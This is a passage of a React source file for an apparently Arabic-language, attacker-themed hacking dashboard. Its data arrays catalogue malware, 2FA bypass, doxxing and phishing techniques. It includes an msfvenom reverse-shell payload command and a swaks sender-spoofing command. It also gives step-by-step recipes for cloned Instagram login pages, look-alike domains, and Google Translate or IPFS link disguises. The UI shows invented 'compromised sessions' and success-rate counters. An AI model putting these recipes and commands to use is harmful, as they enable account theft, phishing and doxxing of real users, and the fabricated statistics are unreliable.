      { name: "Clipper Malware", desc: "يستبدل عناوين محافظ الكريبتو في الحافظة" },
    ],
    tools: ["Metasploit", "Covenant", "Sliver C2", "njRAT", "AsyncRAT", "RedLine Stealer"],
    defense: "Antivirus + EDR + لا تحمّل من مصادر مجهولة + Sandbox Analysis",
    technical: [
      "msfvenom: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe",
      "RedLine Stealer: يسرق passwords من Chrome/Firefox/Edge والـ Cookies والـ Crypto Wallets",
      "njRAT: أشهر RAT للمنطقة العربية — GUI سهل وميزات متعددة",
      "Persistence: Registry Run Keys + Scheduled Tasks + Startup Folder",
    ],
  },
  {
    id: "2fa_bypass", name: "تجاوز المصادقة الثنائية", english: "2FA / MFA Bypass",
    color: "#ec4899", severity: "CRITICAL", icon: Smartphone,
    desc: "تقنيات متقدمة لتجاوز أو اعتراض رموز 2FA في الوقت الفعلي أو هجوم على البنية التحتية",
    subtypes: [
      { name: "Real-time Phishing (MitM)", desc: "الموقع يمرر 2FA مباشرة — الرمز يُعترض فورياً" },
      { name: "SIM Swapping", desc: "إقناع مزود الاتصال بنقل رقم الهاتف لشريحة المهاجم" },
      { name: "SS7 Attack", desc: "استغلال ثغرات شبكة الاتصال العالمية SS7 لاختطاف SMS" },
      { name: "Authenticator App Clone", desc: "نقل TOTP Secret Key إلى جهاز المهاجم" },
      { name: "Backup Code Theft", desc: "سرقة رموز الاسترداد الاحتياطية عبر الهندسة الاجتماعية" },
      { name: "OTP Bot", desc: "بوت يتصل بالضحية ويقنعها بمشاركة الكود صوتياً" },
      { name: "Push Notification Fatigue", desc: "إرسال آلاف طلبات MFA حتى يضغط المستخدم قبولاً" },
    ],
    tools: ["Modlishka", "Evilginx2", "SocialFish v3", "Muraena", "CredSniper"],
    defense: "FIDO2 Hardware Keys (YubiKey) + Microsoft Authenticator + لا تشارك OTP أبداً",
    technical: [
      "MFA Fatigue: هجوم Uber 2022 — 100+ push notification حتى استسلم الموظف",
      "SIM Swap: انتحال هوية لدى مزود الاتصال مع وثائق مزورة",
      "Evilginx2: يعمل في الوسط بين الضحية والموقع الحقيقي",
      "OTP Bot: نص تلقائي 'مرحباً، نتصل من Instagram Security...'",
    ],
  },
  {
    id: "metadata", name: "استخراج البيانات الوصفية", english: "Metadata & EXIF Scraping",
    color: "#6366f1", severity: "MEDIUM", icon: Camera,
    desc: "استخراج معلومات خفية مدمجة في الصور والمستندات: GPS، الجهاز، الوقت، نظام التشغيل",
    subtypes: [
      { name: "EXIF GPS Extraction", desc: "تحديد الموقع الجغرافي الدقيق من صورة selfie" },
      { name: "Device Fingerprinting", desc: "تحديد الجهاز ونظام التشغيل وإصدار الكاميرا" },
      { name: "Document Metadata", desc: "كشف مستخدمي Windows من ملفات Word/PDF" },
      { name: "Image Fingerprinting", desc: "ربط صور مختلفة بنفس الكاميرا عبر noise pattern" },
      { name: "Reverse Image Search", desc: "إيجاد حسابات مخفية بنفس الصورة الشخصية" },
      { name: "Thumbnail Forensics", desc: "الصورة المصغرة المدمجة قد تكون نسخة قديمة غير معدلة" },
    ],
    tools: ["ExifTool", "Metagoofil", "FOCA", "Jeffrey's EXIF Viewer", "Google Images", "TinEye"],
    defense: "مسح EXIF قبل النشر + إيقاف موقع الكاميرا + استخدام Signal بدل WhatsApp",
    technical: [
      "exiftool photo.jpg | grep -i GPS",
      "exiftool -all= photo.jpg  (مسح كل البيانات الوصفية)",
      "Reverse search: images.google.com أو tineye.com",
      "FOCA يجمع PDF/DOC من site:target.com filetype:pdf تلقائياً",
    ],
  },
  {
    id: "username_enum", name: "تعداد أسماء المستخدمين", english: "Username Enumeration",
    color: "#22d3ee", severity: "MEDIUM", icon: AtSign,
    desc: "تحديد وجود حسابات محددة على مختلف المنصات واستخدامها في بناء ملف OSINT شامل للهدف",
    subtypes: [
      { name: "HTTP Response Analysis", desc: "HTTP 200 = موجود، 404 = غير موجود، 302 = مخفي" },
      { name: "Response Time Analysis", desc: "وقت الاستجابة قد يكشف وجود الحساب حتى مع خطأ 404" },
      { name: "Error Message Differences", desc: "رسائل خطأ مختلفة لحسابات موجودة/غير موجودة" },
      { name: "Registration Form Check", desc: "'اسم المستخدم هذا محجوز' = الحساب موجود" },
      { name: "Password Reset Oracle", desc: "صفحة استعادة كلمة المرور تكشف وجود البريد الإلكتروني" },
      { name: "API Enumeration", desc: "استعلام API مباشر للتحقق من وجود username" },
    ],
    tools: ["Sherlock", "WhatsMyName", "Namech_k", "Recon-ng", "theHarvester", "Maltego"],
    defense: "توحيد رسائل الخطأ + Rate Limiting + CAPTCHA على صفحات الاسترداد",
    technical: [
      "sherlock username --output results.txt --timeout 10",
      "whatsmyname.app — لقطة ويب أسرع",
      "API Twitter: GET /users/by/username/{username} (بدون auth — مكشوف)",
      "Instagram: HTTP 200 لـ instagram.com/username لحسابات موجودة",
    ],
  },
  {
    id: "doxxing", name: "الـ Doxxing وكشف الهوية", english: "Doxxing & Identity Exposure",
    color: "#ef4444", severity: "HIGH", icon: Fingerprint,
    desc: "جمع وتحليل ونشر معلومات شخصية عن شخص ما من مصادر مفتوحة متعددة",
    subtypes: [
      { name: "Reverse Phone Lookup", desc: "كشف الاسم والعنوان من رقم الهاتف" },
      { name: "Email to Identity", desc: "ربط البريد الإلكتروني بهوية كاملة" },
      { name: "Photo Geolocation", desc: "تحديد موقع الصورة من الخلفية والمعالم" },
      { name: "Voter Records OSINT", desc: "سجلات ناخبين علنية تحتوي عنوان المنزل والهاتف" },
      { name: "Data Broker Harvesting", desc: "استخراج بيانات من مواقع وسطاء البيانات" },
      { name: "Social Graph Analysis", desc: "تحديد المنزل/العمل من خريطة نشاط وسائل التواصل" },
    ],
    tools: ["Maltego", "SpiderFoot", "Recon-ng", "Spokeo", "BeenVerified", "PimEyes"],
    defense: "Opt-out من مواقع Data Brokers + إعدادات خصوصية صارمة + VPN",
    technical: [
      "PimEyes: البحث العكسي بالوجه — أخطر أداة doxxing حالياً",
      "Spokeo/BeenVerified: عنوان المنزل + رقم الهاتف مقابل $5",
      "Google Alerts لاسمك: تنبيه فوري عند نشر معلوماتك",
      "OPSEC: منع correlation بين حسابات مختلفة",
    ],
  },
];

const CREDENTIAL_TECHNIQUES = [
  {
    id: "classic_phish", name: "تصيد الموقع الكلاسيكي", color: "#e21227",
    icon: Globe, risk: "CRITICAL",
    desc: "استنساخ صفحة تسجيل دخول حقيقية واستضافتها على نطاق مشابه",
    steps: [
      "1. نسخ HTML/CSS/JS الكامل لصفحة تسجيل الدخول (wget --mirror)",
      "2. تعديل form action لإرسال البيانات للمهاجم",
      "3. تسجيل نطاق مشابه: instagram-security.com / ig-verify.net",
      "4. طلب SSL certificate مجاني من Let's Encrypt",
      "5. نشر صفحة التصيد + إعداد Credential Logger",
      "6. إرسال رابط التصيد عبر SMS/Email/DM مع pretexting مناسب",
    ],
    bypass: ["Google Translate Redirect", "Bit.ly Shortener", "Cloudflare IPFS", "TOR Hidden Service"],
  },
  {
    id: "google_translate", name: "Google Translate Bypass", color: "#f97316",
    icon: Globe, risk: "HIGH",
    desc: "استخدام Google Translate كـ proxy لإخفاء الرابط الأصلي وتجاوز فلاتر الأمان",
    steps: [
      "1. إنشاء صفحة التصيد على أي استضافة",
      "2. بناء رابط: translate.google.com/translate?sl=en&tl=ar&u=YOUR_PHISH_URL",
      "3. الرابط يبدو شرعياً جداً — نطاق google.com!",
      "4. المستخدم يدخل بيانات الاعتماد ضانّاً أنه على موقع Google",
      "5. يُعيد توجيه البيانات لـ Credential Harvester",
      "6. نفس الأسلوب: Bing Translate، Yandex Translate",
    ],
    bypass: ["Google Domain Trust", "HTTPS Native", "No Phishing Filter Detection"],
  },
  {
    id: "cloudflare_ipfs", name: "Cloudflare IPFS Hosting", color: "#a855f7",
    icon: Server, risk: "HIGH",
    desc: "استضافة صفحة التصيد على IPFS عبر Cloudflare — يصعب إزالتها ونطاق موثوق",
    steps: [
      "1. نشر صفحة التصيد على IPFS عبر ipfs.io أو Pinata",
      "2. الحصول على IPFS Hash: QmXxx...",
      "3. الرابط النهائي: QmXxx.ipfs.cf-ipfs.com",
      "4. النطاق: cf-ipfs.com — ينتمي لـ Cloudflare (موثوق جداً)",
      "5. صعب الحجب: محتوى لا مركزي — لا خادم واحد",
      "6. يمر من معظم Corporate Proxies وWeb Filters",
    ],
    bypass: ["Cloudflare Trust", "Decentralized Content", "HTTPS Valid Cert"],
  },
  {
    id: "tabnabbing", name: "Tabnabbing Attack", color: "#00e5ff",
    icon: Monitor, risk: "HIGH",
    desc: "استبدال محتوى تبويب المتصفح غير النشط بصفحة تسجيل دخول مزيفة أثناء غياب المستخدم",
    steps: [
      "1. إغراء الضحية لزيارة موقع خبيث (إعلان، بريد، DM)",
      "2. الصفحة تحتوي JavaScript يراقب visibilitychange",
      "3. عند تبديل التبويب: تتغير الصفحة لصفحة تسجيل دخول مزيفة",
      "4. يتغير عنوان الصفحة وفافيكون ليشبه Gmail/Facebook",
      "5. المستخدم يعود ويجد ما يبدو أنه 'انتهت جلستك'",
      "6. يُدخل بيانات اعتماده دون شك — يُسرق فوراً",
    ],
    bypass: ["No URL Bar Warning", "Familiar Page Look", "User Already Trusts the Tab"],
  },
  {
    id: "email_spoofing", name: "تزوير هوية المرسل", color: "#10b981",
    icon: Mail, risk: "HIGH",
    desc: "إرسال بريد إلكتروني يبدو قادماً من Instagram/Facebook مع تزوير عنوان المرسل",
    steps: [
      "1. إعداد خادم SMTP مع SPF/DKIM ضعيف أو مفقود",
      "2. استخدام: Spoofbox, Email Spoofer Pro, Swaks",
      "3. تعيين From: security@instagram.com",
      "4. صياغة بريد HTML احترافي مطابق لتصميم Instagram",
      "5. تضمين رابط تصيد مخفي خلف زر 'تأكيد الهوية'",
      "6. Swaks: swaks --to victim@email.com --from security@instagram.com",
    ],
    bypass: ["Display Name Spoofing", "Sub-domain Spoofing", "Look-alike Domains"],
  },
];

const SUPPORT_TOOLS = [
  {
    id: "burp", name: "Burp Suite Professional", category: "Web App Security Testing",
    color: "#f97316", icon: Globe, threat: "HIGH", vendor: "PortSwigger",
    desc: "المعيار الذهبي لاختبار أمان تطبيقات الويب — يعترض ويعدل ويحلل كل حركة HTTP/HTTPS",
    features: [
      { name: "Proxy Interceptor", detail: "اعتراض وتعديل كل طلب/استجابة HTTP/HTTPS في الوقت الفعلي" },
      { name: "Repeater", detail: "إعادة إرسال طلبات معدلة يدوياً لاختبار السلوك" },
      { name: "Intruder (Fuzzer)", detail: "تنفيذ هجمات Fuzzing ذكية على أي معامل HTTP" },
      { name: "Active Scanner", detail: "فحص تلقائي لـ XSS, SQLi, SSRF, XXE, Path Traversal" },
      { name: "Collaborator", detail: "اكتشاف ثغرات Blind: SSRF, XXE, Log4Shell خارج النطاق" },
      { name: "Match & Replace", detail: "استبدال تلقائي لأي نص في الطلبات/الاستجابات" },
      { name: "Extension (BApp Store)", detail: "+800 إضافة مجتمعية: JWT Decoder, Auth Analyzer, Turbo Intruder" },
      { name: "API Security Testing", detail: "فحص GraphQL, REST, gRPC APIs بشكل شامل" },
    ],
  },
  {
    id: "metasploit", name: "Metasploit Framework", category: "Exploitation Engine",
    color: "#e21227", icon: Zap, threat: "CRITICAL", vendor: "Rapid7",
    desc: "أكبر وأشهر إطار عمل للاستغلال — يحتوي على 2000+ exploit و500+ payload جاهزة للاستخدام",
    features: [
      { name: "2000+ Exploits", detail: "أكبر مكتبة exploits في العالم — تُحدَّث يومياً بثغرات جديدة" },
      { name: "Meterpreter Shell", detail: "shell متقدم في الذاكرة: تصفح ملفات، كاميرا، keylogger، VNC" },
      { name: "Payload Generator (msfvenom)", detail: "توليد payloads: exe/dll/apk/py/bash لأي نظام تشغيل" },
      { name: "Post-Exploitation Modules", detail: "hashdump, persistence, pivot, screenshot, getsystem" },
      { name: "Auxiliary Modules", detail: "scanners, fuzzers, credential testers, brute forcers" },
      { name: "SET Integration", detail: "تكامل كامل مع Social Engineer Toolkit" },
      { name: "MSF Console (msfconsole)", detail: "واجهة سطر أوامر تفاعلية متقدمة مع تاريخ أوامر" },
      { name: "Armitage GUI", detail: "واجهة رسومية لإدارة الضحايا والجلسات بصرياً" },
    ],
  },
  {
    id: "shodan", name: "Shodan", category: "Internet Intelligence",
    color: "#00e5ff", icon: Search, threat: "HIGH", vendor: "Shodan.io",
    desc: "محرك البحث الأول لأجهزة الإنترنت — يكتشف الخوادم والكاميرات والأجهزة المكشوفة حول العالم",
    features: [
      { name: "Real-time Device Discovery", detail: "فحص مستمر للإنترنت — 500 مليون جهاز مفهرس" },
      { name: "Vuln Database", detail: "ربط الأجهزة بـ CVEs تلقائياً — 'سيرفر Instagram بثغرة Log4Shell'" },
      { name: "Favicon Hash Search", detail: "البحث بـ hash لأيقونة الموقع لإيجاد نسخ مخفية" },
      { name: "SSL Certificate Analysis", detail: "البحث بـ Common Name — إيجاد subdomains مخفية" },
      { name: "Alert System", detail: "تنبيه فوري عند ظهور IP/نطاق جديد يخص الهدف" },
      { name: "Shodan Maps", detail: "خريطة عالمية لتوزيع الأجهزة المكشوفة بحسب الثغرة" },
      { name: "API Access", detail: "API كاملة للاستخدام في أدوات OSINT الأخرى" },
      { name: "Historical Data", detail: "سجل تاريخي لكل IP — تتبع التغييرات عبر الزمن" },
    ],
  },
  {
    id: "pydictor", name: "Pydictor", category: "Intelligent Wordlist Generator",
    color: "#10b981", icon: Key, threat: "MEDIUM", vendor: "LandGrey",
    desc: "مولّد قوائم كلمات مرور ذكي ومخصص — يبني قاموساً بناءً على معلومات الهدف الشخصية",
    features: [
      { name: "Social Profile Analysis", detail: "يحلل ملف الشخص: الاسم، تاريخ الميلاد، أرقام هامة، اهتمامات" },
      { name: "LEET Rules Engine", detail: "تحويلات LEET: a→4, e→3, i→1, o→0, s→5 بكل الاحتمالات" },
      { name: "Pattern Rules", detail: "قواعد مخصصة: Name+Year, Name+!, Name+Birthday, etc." },
      { name: "Dictionary Merge", detail: "دمج قواميس متعددة مع إزالة التكرار وترتيب الأولوية" },
      { name: "Word Mutation", detail: "تحويلات ذكية: كلمة → كلمة1 → كلمة123 → كلمة@123" },
      { name: "Custom Charset", detail: "تحديد أحرف/أرقام/رموز + طول min/max" },
      { name: "Hybrid Attack Mode", detail: "دمج Dictionary + Bruteforce لتغطية أشمل" },
      { name: "Output Optimization", detail: "ترتيب الكلمات حسب الاحتمالية مع statistics" },
    ],
  },
  {
    id: "wireshark", name: "Wireshark", category: "Network Protocol Analyzer",
    color: "#6366f1", icon: Wifi, threat: "HIGH", vendor: "Wireshark Foundation",
    desc: "محلل حزم الشبكة الأشهر في العالم — يلتقط ويحلل كل بت يتحرك عبر الشبكة",
    features: [
      { name: "Deep Packet Inspection", detail: "تحليل عميق لأكثر من 3000 بروتوكول شبكي" },
      { name: "Credential Sniffing", detail: "استخراج كلمات المرور من HTTP/FTP/SMTP/IMAP غير المشفر" },
      { name: "Cookie Extraction", detail: "استخراج session cookies من حركة HTTP لاختطاف الجلسة" },
      { name: "WiFi Monitor Mode", detail: "التقاط حزم WiFi في وضع Monitor (IEEE 802.11)" },
      { name: "Display Filters", detail: "فلاتر قوية: http.request.method=='POST' && tcp.port==80" },
      { name: "Follow TCP Stream", detail: "عرض محادثة TCP كاملة بصياغة مقروءة" },
      { name: "Export Objects", detail: "استخراج الملفات المُنقلة: صور، مستندات، كود" },
      { name: "Statistics Dashboard", detail: "إحصاءات تفصيلية: Protocol Hierarchy, Conversations, Endpoints" },
    ],
  },
  {
    id: "ettercap", name: "Ettercap / Bettercap", category: "MitM Attack Suite",
    color: "#f59e0b", icon: Network, threat: "HIGH", vendor: "Ettercap Project",
    desc: "منظومة هجمات Man-in-the-Middle متكاملة — ARP Poisoning، SSL Strip، Credential Sniffing",
    features: [
      { name: "ARP Cache Poisoning", detail: "تسميم جداول ARP لإعادة توجيه حركة الشبكة عبر المهاجم" },
      { name: "SSL Stripping", detail: "تحويل HTTPS إلى HTTP لاعتراض بيانات الاعتماد" },
      { name: "DNS Spoofing", detail: "إعادة توجيه طلبات DNS لخادم مزيف (تصيد محلي)" },
      { name: "Credential Harvesting", detail: "التقاط credentials من كل البروتوكولات تلقائياً" },
      { name: "Plugin System", detail: "plugins: dos_attack, find_conn, isolate, repoison_arp" },
      { name: "Bettercap Upgrade", detail: "الإصدار الحديث: bettercap أسرع وأقوى مع REST API" },
    ],
  },
  {
    id: "recon_ng", name: "Recon-ng", category: "Web Reconnaissance Framework",
    color: "#8b5cf6", icon: Radar, threat: "HIGH", vendor: "Lanmaster53",
    desc: "إطار استطلاع ويب بالكامل مكتوب بـ Python — مئات الوحدات لجمع معلومات OSINT منظمة",
    features: [
      { name: "Module Marketplace", detail: "+160 وحدة: Shodan, Have I Been Pwned, Bing, PGP, LinkedIn" },
      { name: "Workspace Management", detail: "تنظيم البحوث في workspaces منفصلة مع قاعدة بيانات SQLite" },
      { name: "API Key Management", detail: "إدارة مفاتيح API لخدمات متعددة بشكل آمن" },
      { name: "Report Generation", detail: "تقارير HTML, CSV, JSON كاملة من نتائج الاستطلاع" },
      { name: "Contact Harvesting", detail: "جمع أسماء وعناوين بريد إلكتروني وأرقام هواتف تلقائياً" },
      { name: "Network Mapping", detail: "رسم خريطة شبكة الهدف من معلومات DNS وWhois" },
    ],
  },
  {
    id: "theharvester", name: "theHarvester", category: "Email & Domain OSINT",
    color: "#22d3ee", icon: Search, threat: "MEDIUM", vendor: "Edge-Security",
    desc: "جمع البريد الإلكتروني، أسماء المستخدمين، النطاقات الفرعية، عناوين IP من مصادر عامة متعددة",
    features: [
      { name: "Email Enumeration", detail: "جمع عناوين بريد إلكتروني من Google, Bing, LinkedIn, Hunter.io" },
      { name: "Subdomain Discovery", detail: "اكتشاف subdomains: Shodan, SecurityTrails, DNSdumpster" },
      { name: "IP Range Discovery", detail: "اكتشاف نطاقات IP المرتبطة بالنطاق المستهدف" },
      { name: "LinkedIn Integration", detail: "استخراج أسماء موظفي الشركة من LinkedIn" },
      { name: "Multiple Sources", detail: "+20 مصدر بحث: Google, Bing, Baidu, Yahoo, DNSdumpster" },
      { name: "Export Results", detail: "تصدير XML, JSON مع خيار حفظ تلقائي" },
    ],
  },
];

// ─── 3D PARTICLE NETWORK ──────────────────────────────────────────────────────
function NetworkCanvas3D({ color = "#e21227", density = 55, speed = 1 }: { color?: string; density?: number; speed?: number }) {
  const cvRef = useRef<HTMLCanvasElement>(null);
  const rafRef = useRef(0);
  useEffect(() => {
    const cv = cvRef.current; if (!cv) return;
    const ctx = cv.getContext("2d")!;
    const DPR = Math.min(window.devicePixelRatio || 1, 2);
    const resize = () => {
      cv.width = cv.offsetWidth * DPR; cv.height = cv.offsetHeight * DPR;
      cv.style.width = cv.offsetWidth + "px"; cv.style.height = cv.offsetHeight + "px";
      ctx.setTransform(1, 0, 0, 1, 0, 0); ctx.scale(DPR, DPR);
    };
    resize();
    const W = () => cv.offsetWidth, H = () => cv.offsetHeight;
    const PALETTE = [color, "#00e5ff", "#a855f7", "#f59e0b", "#10b981"];
    interface Pt { x:number; y:number; z:number; vx:number; vy:number; vz:number; r:number; c:string }
    const pts: Pt[] = Array.from({ length: density }, () => ({
      x: Math.random() * W(), y: Math.random() * H(), z: Math.random() * 200 - 100,
      vx: (Math.random() - 0.5) * 0.35 * speed, vy: (Math.random() - 0.5) * 0.35 * speed,
      vz: (Math.random() - 0.5) * 0.25 * speed,
      r: Math.random() * 2.5 + 1,
      c: PALETTE[Math.floor(Math.random() * PALETTE.length)],
    }));
    let t = 0;
    function draw() {
      t += 0.004 * speed; ctx.clearRect(0, 0, W(), H());
      // Scanline
      const scanY = ((t * 50) % (H() + 30)) - 15;
      ctx.fillStyle = `rgba(226,18,39,0.04)`; ctx.fillRect(0, scanY, W(), 2);
      pts.forEach(p => {
        p.x += p.vx; p.y += p.vy; p.z += p.vz;
        if (p.x < 0 || p.x > W()) p.vx *= -1;
        if (p.y < 0 || p.y > H()) p.vy *= -1;
        if (p.z < -100 || p.z > 100) p.vz *= -1;
      });
      for (let i = 0; i < pts.length; i++) for (let j = i + 1; j < pts.length; j++) {
        const dx = pts[i].x - pts[j].x, dy = pts[i].y - pts[j].y;
        const d = Math.sqrt(dx*dx + dy*dy);
        if (d < 120) {
          const a = (1 - d/120) * 0.35;
          ctx.beginPath(); ctx.moveTo(pts[i].x, pts[i].y); ctx.lineTo(pts[j].x, pts[j].y);
          ctx.strokeStyle = pts[i].c + Math.round(a * 255).toString(16).padStart(2,"0");
          ctx.lineWidth = 0.5; ctx.stroke();
        }
      }
      pts.forEach(p => {
        const scale = (p.z + 100) / 200;
        const r = p.r * (0.5 + scale * 0.9);
        const pulse = 0.85 + 0.15 * Math.sin(t * 3 + p.x * 0.01);
        const gr = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, r * 3.5);
        gr.addColorStop(0, p.c + "99"); gr.addColorStop(1, p.c + "00");
        ctx.beginPath(); ctx.arc(p.x, p.y, r * 3.5, 0, Math.PI * 2); ctx.fillStyle = gr; ctx.fill();
        ctx.beginPath(); ctx.arc(p.x, p.y, r * pulse, 0, Math.PI * 2);
        ctx.fillStyle = p.c + "dd"; ctx.shadowColor = p.c; ctx.shadowBlur = 8; ctx.fill(); ctx.shadowBlur = 0;
      });
      rafRef.current = requestAnimationFrame(draw);
    }
    draw(); return () => cancelAnimationFrame(rafRef.current);
  }, [color, density, speed]);
  return <canvas ref={cvRef} className="absolute inset-0 w-full h-full" style={{ opacity: 0.32 }} />;
}

// ─── ATTACK RADAR ─────────────────────────────────────────────────────────────
function AttackRadar({ size = 220 }: { size?: number }) {
  const cvRef = useRef<HTMLCanvasElement>(null);
  const rafRef = useRef(0);
  useEffect(() => {
    const cv = cvRef.current; if (!cv) return;
    const ctx = cv.getContext("2d")!;
    const DPR = Math.min(window.devicePixelRatio || 1, 2);
    cv.width = size * DPR; cv.height = size * DPR;
    cv.style.width = size + "px"; cv.style.height = size + "px";
    ctx.scale(DPR, DPR);
    const cx = size/2, cy = size/2, R = size/2 - 10;
    const blips = Array.from({ length: 12 }, (_, i) => ({
      angle: Math.random() * Math.PI * 2, dist: 15 + Math.random() * (R - 20),
      color: ["#e21227","#f97316","#f59e0b","#a855f7","#10b981","#00e5ff"][i % 6],
      life: Math.random(), speed: 0.004 + Math.random() * 0.006,
    }));
    let sweep = 0;
    function draw() {
      sweep += 0.02; ctx.clearRect(0, 0, size, size);
      [1, 0.7, 0.45, 0.22].forEach(r => {
        ctx.beginPath(); ctx.arc(cx, cy, R*r, 0, Math.PI*2);
        ctx.strokeStyle = "rgba(226,18,39,0.12)"; ctx.lineWidth = 0.8; ctx.stroke();
      });
      // Crosshairs
      ctx.strokeStyle = "rgba(226,18,39,0.08)"; ctx.lineWidth = 0.5;
      for (let a = 0; a < Math.PI * 2; a += Math.PI / 4) {
        ctx.beginPath(); ctx.moveTo(cx, cy);
        ctx.lineTo(cx + Math.cos(a) * R, cy + Math.sin(a) * R); ctx.stroke();
      }
      // Sweep
      ctx.save(); ctx.translate(cx, cy); ctx.rotate(sweep);
      const g = ctx.createLinearGradient(0, 0, R, 0);
      g.addColorStop(0, "rgba(226,18,39,0.7)"); g.addColorStop(0.4, "rgba(226,18,39,0.15)"); g.addColorStop(1, "rgba(226,18,39,0)");
      ctx.beginPath(); ctx.moveTo(0, 0); ctx.arc(0, 0, R, -0.12, 1.4, false); ctx.closePath();
      ctx.fillStyle = g; ctx.fill(); ctx.restore();
      // Outer ring
      ctx.beginPath(); ctx.arc(cx, cy, R, 0, Math.PI*2);
      ctx.strokeStyle = "rgba(226,18,39,0.55)"; ctx.lineWidth = 1.5; ctx.stroke();
      // Blips
      blips.forEach(b => {
        b.life -= b.speed; if (b.life < 0) { b.angle = Math.random()*Math.PI*2; b.dist = 15 + Math.random()*(R-20); b.life = 1; }
        const bx = cx + Math.cos(b.angle) * b.dist, by = cy + Math.sin(b.angle) * b.dist;
        const g2 = ctx.createRadialGradient(bx, by, 0, bx, by, 9);
        g2.addColorStop(0, b.color + "ff"); g2.addColorStop(1, b.color + "00");
        ctx.beginPath(); ctx.arc(bx, by, 9, 0, Math.PI*2);
        ctx.fillStyle = g2; ctx.globalAlpha = b.life * 0.9; ctx.fill(); ctx.globalAlpha = 1;
        ctx.beginPath(); ctx.arc(bx, by, 3, 0, Math.PI*2);
        ctx.fillStyle = b.color; ctx.shadowColor = b.color; ctx.shadowBlur = 12; ctx.fill(); ctx.shadowBlur = 0;
      });
      // Center
      const cg = ctx.createRadialGradient(cx, cy, 0, cx, cy, 14);
      cg.addColorStop(0, "#e21227ff"); cg.addColorStop(1, "#e2122700");
      ctx.beginPath(); ctx.arc(cx, cy, 14, 0, Math.PI*2); ctx.fillStyle = cg; ctx.fill();
      ctx.beginPath(); ctx.arc(cx, cy, 5, 0, Math.PI*2);
      ctx.fillStyle = "#e21227"; ctx.shadowColor = "#e21227"; ctx.shadowBlur = 18; ctx.fill(); ctx.shadowBlur = 0;
      rafRef.current = requestAnimationFrame(draw);
    }
    draw(); return () => cancelAnimationFrame(rafRef.current);
  }, [size]);
  return <canvas ref={cvRef} />;
}

// ─── LIVE STATS ───────────────────────────────────────────────────────────────
function LiveTicker() {
  const [s, setS] = useState({ accounts: 3847293, breach: 184821347, active: 127, success: 94.2, tools: 32, vulns: 8891, sessions: 47 });
  useEffect(() => {
    const iv = setInterval(() => setS(prev => ({
      ...prev,
      accounts: prev.accounts + Math.floor(Math.random() * 400),
      breach: prev.breach + Math.floor(Math.random() * 8000),
      active: 120 + Math.floor(Math.random() * 25),
      vulns: prev.vulns + Math.floor(Math.random() * 4),
      sessions: 40 + Math.floor(Math.random() * 20),
    })), 1800);
    return () => clearInterval(iv);
  }, []);
  const items = [
    { label: "حسابات مرصودة", val: s.accounts.toLocaleString(), color: "#e21227" },
    { label: "سجلات مسربة", val: `${(s.breach / 1e6).toFixed(1)}M`, color: "#f97316" },
    { label: "عمليات نشطة", val: s.active, color: "#a855f7" },
    { label: "معدل النجاح", val: `${s.success}%`, color: "#10b981" },
    { label: "أدوات نشطة", val: s.tools, color: "#00e5ff" },
    { label: "ثغرات مكتشفة", val: s.vulns.toLocaleString(), color: "#f59e0b" },
    { label: "جلسات مخترقة", val: s.sessions, color: "#ec4899" },
  ];
  return (
    <div className="grid grid-cols-4 md:grid-cols-7 gap-2">
      {items.map(it => (
        <div key={it.label} className="flex flex-col items-center w-7 h-7 flex items-center justify-center rounded-lg border"
          style={{ borderColor: it.color + "30", background: it.color + "08" }}>
          <div className="text-base font-bold font-mono" style={{ color: it.color, textShadow: `0 0 10px ${it.color}80` }}>{it.val}</div>
          <div className="text-[8px] text-gray-500 font-mono tracking-wider text-center mt-0.5">{it.label}</div>
        </div>
      ))}
    </div>
  );
}

// ─── FRAMEWORK CARD ───────────────────────────────────────────────────────────
function FrameworkCard({ fw }: { fw: typeof FRAMEWORKS[0] }) {
  const [expanded, setExpanded] = useState(false);
  const [running, setRunning] = useState(false);
  const [log, setLog] = useState<string[]>([]);
  const simulate = useCallback(async () => {
    setRunning(true); setLog([]);
    const lines = [
      `[*] Loading ${fw.name} ${fw.version}...`,
      `[+] Core modules initialized`,
      ...fw.features.slice(0, 4).map(f => `[+] Module: ${f.name} — ACTIVE`),
      `[*] Attack surface analysis...`,
      `[!] ${fw.stats.platforms} platforms targeted — ${fw.stats.success} historical success rate`,
      `[✓] Framework READY — awaiting target configuration`,
    ];
    for (const line of lines) {
      await new Promise(r => setTimeout(r, 160 + Math.random() * 120));
      setLog(p => [...p, line]);
    }
    setRunning(false);
  }, [fw]);

  return (
    <motion.div layout className="rounded-[18px] border overflow-hidden"
      style={{ borderColor: fw.color + "30", background: "rgba(0,0,0,0.75)", boxShadow: `0 0 25px ${fw.color}10` }}>
      <div className="p-4 cursor-pointer" onClick={() => setExpanded(!expanded)}
        style={{ background: `linear-gradient(135deg, ${fw.color}0d 0%, transparent 65%)` }}>
        <div className="flex items-center justify-between mb-2">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl flex items-center justify-center text-xl font-bold"
              style={{ background: fw.color + "20", border: `1px solid ${fw.color}40`, color: fw.color, textShadow: `0 0 12px ${fw.color}` }}>
              {fw.icon}
            </div>
            <div>
              <div className="font-bold text-white text-sm font-mono">{fw.name}</div>
              <div className="flex items-center gap-2">
                <span className="text-[9px] text-gray-400 font-mono">{fw.dev}</span>
                <span className="text-[8px] font-mono px-1.5 py-0.5 rounded" style={{ background: fw.color + "20", color: fw.color }}>{fw.version}</span>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-[9px] font-bold px-2 py-0.5 rounded-full font-mono"
              style={{ background: SEV_COLOR[fw.threat] + "25", color: SEV_COLOR[fw.threat], border: `1px solid ${SEV_COLOR[fw.threat]}40` }}>{fw.threat}</span>
            <motion.div animate={{ rotate: expanded ? 90 : 0 }}><ChevronRight size={15} style={{ color: fw.color }} /></motion.div>
          </div>
        </div>
        <p className="text-[10px] text-gray-400 font-mono leading-relaxed">{fw.desc}</p>
        <div className="grid grid-cols-4 gap-2 mt-3">
          {Object.entries(fw.stats).map(([k, v]) => (
            <div key={k} className="text-center w-7 h-7 flex items-center justify-center rounded-lg" style={{ background: fw.color + "0a" }}>
              <div className="text-sm font-bold font-mono" style={{ color: fw.color }}>{v}</div>
              <div className="text-[8px] text-gray-600 font-mono uppercase">{k}</div>
            </div>
          ))}
        </div>
        <div className="flex flex-wrap gap-1 mt-2">
          {fw.modes.map(m => (
            <span key={m} className="text-[8px] font-mono px-1.5 py-0.5 rounded"
              style={{ background: fw.color + "15", color: fw.color, border: `1px solid ${fw.color}25` }}>{m}</span>
          ))}
        </div>
      </div>
